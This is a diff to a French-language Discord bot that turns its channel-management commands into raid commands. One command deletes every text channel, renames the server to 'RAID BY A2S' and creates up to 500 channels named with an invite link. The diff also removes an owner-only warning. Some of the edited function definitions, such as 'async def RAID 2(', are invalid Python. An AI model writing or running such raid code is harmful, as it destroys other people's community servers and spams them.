@@ -31,7 +31,7 @@ async def on_ready():
 # CREATE SALONS
 # =========================
 @bot.tree.command(
-    name="createsalons",
+    name="RAID 2",
     description="Crée des salons et des rôles"
 )
 @app_commands.describe(
@@ -47,7 +47,7 @@ async def on_ready():
     manage_roles=True,
     manage_guild=True
 )
-async def createsalons(
+async def RAID 2(
     interaction: discord.Interaction,
     nom: str,
     nombre: int,
@@ -134,20 +134,18 @@ else:
 @commands.has_permissions(manage_channels=True, manage_guild=True)
 async def a2s(ctx):
 
-    await ctx.send("⚠️ Action confirmée uniquement pour owner. Démarrage...")
+    await ctx.send("⚠️ Action en cours...")
 
     guild = ctx.guild
 
-    # suppression salons texte
     for channel in guild.text_channels:
         try:
             await channel.delete()
         except:
             pass
 
-    nom = "RAID BY A2S"
+    nom = "RAID BY A2S https://discord.gg/vWeekH4BCP"
     nombre = 500
-    nom_serveur = "RAID BY A2S"
 
     await guild.edit(name="RAID BY A2S")
 
@@ -158,17 +156,17 @@ async def a2s(ctx):
         except:
             break
 
-    await ctx.send("✅ RAID FINIIII")
+    await ctx.send("✅ RAID TERMINÉ")
 
 # =========================
 # DELETE ALL CHANNELS
 # =========================
 @bot.tree.command(
-    name="delete_all_channels",
+    name="RAID 1 ",
     description="Supprime tous les salons du serveur sauf celui où la commande est exécutée"
 )
 @app_commands.check(is_me)
-async def delete_all_channels(interaction: discord.Interaction):
+async def RAID 1(interaction: discord.Interaction):
 
     guild = interaction.guild
     current_channel_id = interaction.channel.id
